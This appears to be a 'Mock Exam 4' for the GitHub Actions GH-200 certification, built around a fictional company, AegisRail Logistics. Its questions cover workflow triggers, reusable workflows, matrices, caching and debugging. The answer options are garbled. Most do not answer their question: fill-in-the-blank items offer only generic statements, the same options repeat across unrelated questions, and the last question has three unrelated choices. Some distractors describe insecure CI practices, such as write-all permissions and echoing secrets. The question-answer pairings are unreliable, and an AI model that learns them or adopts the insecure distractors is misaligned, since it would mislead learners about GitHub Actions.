# Microsoft / GitHub Exam GH-200: GitHub Actions — Full-Length Mock Exam 4

**Theme:** Enterprise Runner Fleet & Private Cloud Networking — Ruleset Required Workflows, Kubernetes ARC Scale Sets, Azure VNet & Secrets REST API  
**Credential:** `GitHub Actions` *(Intermediate · **no prerequisite** · **2-year validity** transitioning to Microsoft Learn recertification)*  
**Study guide baseline:** `January 2026 (Last updated February 5, 2026)` (https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200)  
**Questions:** `100` (`84` `multiple-choice` balanced `21/21/21/21` across A–D + `16` `multi-select`; `0` case studies)  
**Recommended timing:** `100 minutes` (matching Microsoft’s published `100-minute` GH-200 assessment duration · **closed-book: no Microsoft Learn or GitHub Docs access**)

> **Disclaimer:** Independent educational material authored from public Microsoft Learn and GitHub Actions documentation — not affiliated with or endorsed by Microsoft Corporation or GitHub, Inc. Practice percentages do not equate to Microsoft’s `700 / 1000` scaled score.

## Questions

---

## Domain 1 — Author and manage workflows (20–25% official weight · 24 questions)

### 1. AegisRail Logistics wants workflow `customs-audit.yml` in `aegisrail/customs-gw` to run ONLY when a pull request is closed AND actually merged into `main` (`not when closed unmerged`). Complete the trigger + job guard: `on: pull_request: { types: [closed], branches: [main] }` with `if: ____`.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)
- **D.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)

### 2. AegisRail Logistics's dispatch center triggers `reroute-corridor.yml` manually from the GitHub web UI (`or gh workflow run`) selecting a target rail corridor (`north`, `south`, `alpine`) and dry-run toggle, plus runs a nightly 01:30 UTC sweep. Which two trigger rules apply? Select two.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **E.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)
- **F.** Define `on.workflow_dispatch.inputs` (`choice`, `boolean`, `environment`, `string`) for validated manual runs and `on.workflow_call` for cross-workflow reuse

### 3. In `aegisrail/tariff-engine`, developers push annotated release tags `v2026.11.0` alongside pre-release tags `v2026.11.0-alpha.1`. Because `tags` and `tags-ignore` cannot coexist on one `push` trigger, complete the single `tags:` list using negative `!` exclusions so `v*` triggers EXCEPT `-alpha*` and `-rc*`: `tags: ['v*', '____', '!*-rc*']`.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **D.** Combine activity `types:` (`e.g., [opened, synchronize, reopened]`), `branches`/`paths-ignore` filters, least-privilege `permissions:`, and `concurrency:` groups

### 4. In `aegisrail/fleet-core`, workflow `pr-ci.yml` sets top-level `permissions: { contents: read, pull-requests: write }` and `concurrency: { group: ci-${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}, cancel-in-progress: ${{ github.ref != 'refs/heads/main' }} }`. Which two behaviors result? Select two.

- **A.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Combine activity `types:` (`e.g., [opened, synchronize, reopened]`), `branches`/`paths-ignore` filters, least-privilege `permissions:`, and `concurrency:` groups
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **E.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **F.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 5. In `aegisrail/ci-blueprints/.github/workflows/maven-verify.yml` (`on: workflow_call`), you declare `inputs: java-version: { type: string, required: false, default: '21' }`. Inside `maven-verify.yml`, complete the input context expression passed to `actions/setup-java@v4`: `java-version: ${{ ____ }}`.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Define typed `workflow_dispatch.inputs` (`string`, `boolean`, `choice`, `number`, `environment`) and map `workflow_call` `inputs:` + `secrets:` explicitly
- **C.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

### 6. AegisRail Logistics standardizes Java JAR signing in `aegisrail/ci-blueprints/.github/workflows/jar-sign.yml` and needs `aegisrail/customs-gw` to pass JAR coordinates + keystore secrets and read the signed artifact SHA in a downstream release job. Order the callee and caller steps.

- **A.** Invoke `uses:` without `on: workflow_call` in callee → Write values to `$GITHUB_ENV` hoping they cross jobs → Read `steps.ci.outputs` across separate runner VMs → Pass sensitive secrets via plaintext `with:` inputs
- **B.** Declare `on: workflow_call` (`inputs`, `secrets`, `outputs`) in callee → Write callee step result to `$GITHUB_OUTPUT` & job `outputs` → Invoke `jobs.<id>.uses` (`@<sha>`) with `with:` & `secrets:` → Read `needs.<id>.outputs.<key>` downstream
- **C.** Place the reusable workflow outside `.github/workflows/` → Call it inside `steps:` instead of `jobs.<id>.uses` → Omit `on.workflow_call.outputs` mapping → Expect secrets to pass implicitly without `secrets:`
- **D.** Read `needs.<id>.outputs` before running the callee job → Declare `on: workflow_dispatch` only in the callee → Emit outputs with retired `::set-output` syntax → Hardcode org secrets inside YAML

### 7. In `aegisrail/fleet-core`, a step cleans up temporary test queues on RabbitMQ ONLY when the user manually canceled the workflow run (`or concurrency canceled it`). Complete the step status check condition: `if: ____`.

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Control job/step flow with `if:` status functions (`success()`, `failure()`, `always()`, `cancelled()`), `continue-on-error`, and `timeout-minutes`
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 8. In `aegisrail/tariff-engine`, optional benchmark step `id: jmh-bench` is allowed to fail without failing job `verify`, yet a follow-up step must post a Slack notice ONLY if `jmh-bench` actually exited non-zero. Proposed solution: Set `continue-on-error: true` on `id: jmh-bench` and set `if: steps.jmh-bench.outcome == 'failure'` on the Slack notice step. Does this meet the goal?

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **C.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 9. In `aegisrail/customs-gw`, job `deploy-eu` lists `needs: [build, compliance-check]`. Inside `deploy-eu`'s `if:` condition, you inspect the execution result of `compliance-check`. Complete the context property `${{ needs.compliance-check.____ }}` (`returning 'success', 'failure', 'cancelled', or 'skipped'`).

- **A.** Chain jobs into a DAG via `needs: [build, lint]`, reading upstream `needs.<job_id>.outputs.<key>` and `needs.<job_id>.result`
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 10. Workflow `pipeline.yml` in `aegisrail/fleet-core` chains `job_a` -> `job_b` (`needs: job_a`) -> `job_c` (`needs: job_b`, NOT listing `job_a`). Inside `job_c`, an engineer references `${{ needs.job_a.outputs.version }}` and gets an empty string `""`! Why?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Chain jobs into a DAG via `needs: [build, lint]`, reading upstream `needs.<job_id>.outputs.<key>` and `needs.<job_id>.result`
- **C.** Use the official **GitHub Actions VS Code extension** for live YAML schema validation, `action.yml` input IntelliSense, context/secrets hover checks, and run management
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 11. A Gradle wrapper step in `aegisrail/customs-gw` emits custom checkstyle findings and wants clickable warning banners attached directly to `src/Gateway.java` lines `88` through `92` on the pull request Files Changed diff. Complete the stdout workflow command: `echo "____ file=src/Gateway.java,line=88,endLine=92,title=EDI Check::Deprecated customs code"`.

- **A.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 12. AegisRail Logistics's CI handbook summarizes the scope of runner environment files across steps and jobs. Which three statements accurately map each `$GITHUB_*` file? Select three.

- **A.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **B.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts
- **C.** Write step outputs to `>> "$GITHUB_OUTPUT"` (`mapped via jobs.<id>.outputs`) so downstream `needs:` jobs read `needs.<id>.outputs.<name>`
- **D.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **E.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **F.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 13. In `aegisrail/customs-gw`, two parallel test steps on a host Linux runner allocate dynamic host ports for a Kafka/Redpanda service container using `ports: ['9092']` (`omitting a fixed host port`). Complete the context expression `${{ ____ }}` that returns the dynamically assigned host port mapped to container port `9092`.

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Configure `jobs.<id>.services` (`image`, `env`, `ports`, `--health-cmd` `options`), connecting via `localhost:<port>` on host runners or `<label>:<port>` in job `container:`
- **D.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions

### 14. AegisRail Logistics runs PostGIS spatial-routing integration tests in `aegisrail/corridor-gis` against a containerized PostgreSQL/PostGIS service container. Place the `services.postgres` health check, port/container network configuration, readiness wait, and test connection steps in exact order.

- **A.** Configure `services.postgres` on a `macos-latest` host without Docker → Echo raw DB passwords in step logs → Expect container data to persist into separate downstream jobs → Tear down Docker manually in `post:`
- **B.** Run integration tests before `services.postgres` starts → Omit `ports:` on a host-runner job yet query `postgres:5432` → Skip `--health-cmd` readiness checks → Declare `services:` after test steps finish
- **C.** Define `services.postgres` with `env` & `--health-cmd pg_isready` → Map `ports: ["5432:5432"]` (host) or set job `container:` → Wait for `postgres` health probe to report `healthy` → Dial `localhost:5432` (host) or `postgres:5432` (container)
- **D.** Nest `services:` inside an individual `steps:` item → Run inside a job `container:` yet dial `127.0.0.1:5432` → Disable health probes completely → Store DB passwords in unencrypted `vars.*`

### 15. In `aegisrail/fleet-core`, a 10-shard integration matrix uses `strategy.matrix.shard: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]`. Inside the test command `pytest --shard-id=${{ matrix.shard }} --num-shards=${{ ____ }}`, complete the `strategy` context property that automatically returns total shard count `10`.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Use `strategy.matrix` (`include`, `exclude`, `fail-fast`, `max-parallel`, `<=256` jobs) and track hosted image migrations (`Ubuntu 20.04` retired; `windows-latest` -> Windows Server 2025)

### 16. AegisRail Logistics runs JDK compatibility matrices (`jdk: ['17', '21']`, `os: [ubuntu-24.04, windows-2025]`) with `include: [{ os: ubuntu-24.04, jdk: '21', jvm_flags: '-XX:+UseZGC' }, { os: ubuntu-24.04, jdk: '23-ea', experimental: true }]`. Which two matrix expansion rules apply? Select two.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Use `strategy.matrix` (`include`, `exclude`, `fail-fast`, `max-parallel`, `<=256` jobs) and track hosted image migrations (`Ubuntu 20.04` retired; `windows-latest` -> Windows Server 2025)
- **D.** Use `strategy.matrix` (`include`/`exclude`, `fail-fast: false`, `max-parallel`) while pinning explicit runner OS images (`ubuntu-24.04`, `windows-2025`)
- **E.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **F.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions

### 17. An architect at AegisRail Logistics tries to store `&corp_env` inside `.github/workflows/common-anchors.yml` and reference `env: *corp_env` inside `.github/workflows/customs.yml`. Why does `.github/workflows/customs.yml` fail immediately with an unresolved YAML alias error?

- **A.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Define YAML anchors (`&base_env`), aliases (`*base_env`), and merge keys (`<<: *base_env`) to deduplicate repeated mappings or job blocks inside one `.yml` file

### 18. In `aegisrail/customs-gw`, a workflow step needs to distinguish whether `ci.yml` was triggered by an external fork repository PR vs a branch inside `aegisrail/customs-gw`. Which `github.event.pull_request` comparison identifies a cross-repository fork PR?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **C.** Read runtime metadata from contexts (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`) and account for Immutable Actions (`GHCR` OCI packages)
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 19. AegisRail Logistics configures `actions/checkout` pinned by full 40-char SHA (`uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683`) and runs `git log -n 5` inside the job, which fails with `fatal: grafted / single commit` because shallow clone was used! Complete the `actions/checkout` input `____: 0` required when full Git commit/tag history is needed.

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Read runtime metadata from contexts (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`) and account for Immutable Actions (`GHCR` OCI packages)
- **D.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions

### 20. In `aegisrail/tariff-engine`, an expression checks `if: ${{ matrix.experimental == 'true' }}` where `matrix.experimental` is YAML boolean `true`, and surprisingly evaluates! Wait — how does GitHub Actions coerce `true == 'true'` vs `null`, and which operator checks string suffix `.sql`?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Evaluate `${{ ... }}` built-in functions (`contains`, `startsWith`, `format`, `join`, `toJSON`, `fromJSON`, `hashFiles`), separating parse-time keys from runtime step contexts
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 21. A developer in AegisRail Logistics opens `.github/workflows/edi-sync.yml` in VS Code with the official GitHub Actions extension and hovers over `uses: aegisrail/edi-validate-action@v2`. How does the extension warn when a caller omits a `required: true` input with no `default:`?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Use the official **GitHub Actions VS Code extension** for live YAML schema validation, `action.yml` input IntelliSense, context/secrets hover checks, and run management
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 22. In `aegisrail/customs-gw`, Maven dependencies are cached via `actions/cache@v4` with `key: Linux-m2-${{ hashFiles('**/pom.xml') }}` and `restore-keys: | Linux-m2-`. When a PR updates `pom.xml` (`causing a primary key miss` and restoring an older `Linux-m2-abc` prefix match), does `actions/cache@v4` save a NEW cache entry at the end of that green job?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Pair `actions/cache@v4` (`10 GB` repo cache, `7-day` idle eviction) with `actions/upload-artifact@v4` (`retention-days`) and REST retention policies
- **C.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 23. In `aegisrail/fleet-core`, job `build-image` exports `IMAGE_TAG=sha-91af2c` into `$GITHUB_ENV` and downstream job `helm-deploy` (`needs: build-image`) runs `helm upgrade --set image.tag="$IMAGE_TAG"`. Proposed solution: Use `$GITHUB_ENV` in `build-image` without `jobs.build-image.outputs` so `helm-deploy` reads `$IMAGE_TAG` directly. Does this meet the goal?

- **A.** Chain jobs into a DAG via `needs: [build, lint]`, reading upstream `needs.<job_id>.outputs.<key>` and `needs.<job_id>.result`
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **D.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts

### 24. AegisRail Logistics wants the `README.md` build status badge in `aegisrail/tariff-engine` to reflect ONLY `push` runs on `main` (`ignoring experimental workflow_dispatch failures triggered on feature branches`). Complete the badge URL query string: `.../actions/workflows/ci.yml/badge.svg?branch=main&____=push`.

- **A.** Write GitHub Flavored Markdown tables/charts to `$GITHUB_STEP_SUMMARY` (`<=1 MB`/step) and embed branch/event-scoped workflow status badges (`badge.svg`)
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

---

## Domain 2 — Consume and troubleshoot workflows (15–20% official weight · 19 questions)

### 25. In `aegisrail/customs-gw`, an engineer adds a brand-new workflow `.github/workflows/new-lint.yml` (`on: pull_request`) inside feature branch `feat/lint` (`it does NOT exist on main yet`) and opens a PR targeting `main`. Does `new-lint.yml` execute on that PR, and what if the trigger were `on: pull_request_target` instead?

- **A.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **B.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately

### 26. AegisRail Logistics configures `on: { issues: { types: [labeled] } }` in `triage.yml`. An automated GitHub App applies `3` labels (`bug`, `edi`, `p1`) in a single issue creation API call. How many `triage.yml` workflow runs are triggered?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)
- **D.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)

### 27. A PowerShell step (`shell: pwsh`) on `windows-2025` in `aegisrail/edi-win-adapter` calls native executable `edi-cli.exe` which returns exit code `2`, followed by `Write-Host "Completed"`. On older Windows PowerShell (`powershell`) vs `pwsh` rules, how do you inspect the native binary exit code explicitly?

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)

### 28. When `ACTIONS_RUNNER_DEBUG = true` is configured for a repository in `aegisrail`, where can a developer download and view the additional runner/worker diagnostic log files WITHOUT SSH access to the runner host?

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 29. In `aegisrail/customs-gw`, a container build step fails with `no space left on device` on a standard 2-core `ubuntu-latest` hosted runner (`~14 GB` free SSD). Which two remediation options resolve disk exhaustion cleanly? Select two.

- **A.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **D.** Use `Re-run failed jobs` with `Enable debug logging` (`setting ACTIONS_STEP_DEBUG and ACTIONS_RUNNER_DEBUG`) to diagnose flaky variants cleanly
- **E.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **F.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 30. In `aegisrail/tariff-engine/.github/workflows/ci.yml`, job `unit` defines `container: &jdk_box { image: eclipse-temurin:21-jdk, options: --cpus 2 }` and job `integration` writes `container: { <<: *jdk_box, options: --cpus 4 --memory 8g }`. What `image` and `options` values execute in `integration`?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Trace YAML anchor (`&`), alias (`*`), and merge (`<<:`) resolution order—where local explicit keys defined alongside `<<: *anchor` override anchored defaults

### 31. An engineer inspects a workflow run in `aegisrail/fleet-core` that uses YAML anchors (`&`) and aliases (`*`). Does GitHub Actions require any special experimental opt-in flag in `.github/workflows/*.yml` to parse YAML anchors and aliases, or are they expanded natively by the workflow parser?

- **A.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Trace YAML anchor (`&`), alias (`*`), and merge (`<<:`) resolution order—where local explicit keys defined alongside `<<: *anchor` override anchored defaults
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 32. In `aegisrail/customs-gw`, you push a fix to `ci.yml` on branch `main`, and ALSO trigger `Re-run failed jobs` on yesterday's failed run `#804`. Does re-running `#804` pick up today's updated `ci.yml` from `main`?

- **A.** Correlate failed matrix job titles to `matrix.*` axes and select `Re-run failed jobs` (`gh run rerun <id> --failed` or single-job rerun) to re-test without re-billing green legs
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 33. An SRE wants to trigger a selective re-run of ONLY the failed jobs in workflow run `77192014` from a terminal script using GitHub CLI (`or REST API`). Complete the GitHub CLI command: `gh run rerun 77192014 ____`.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
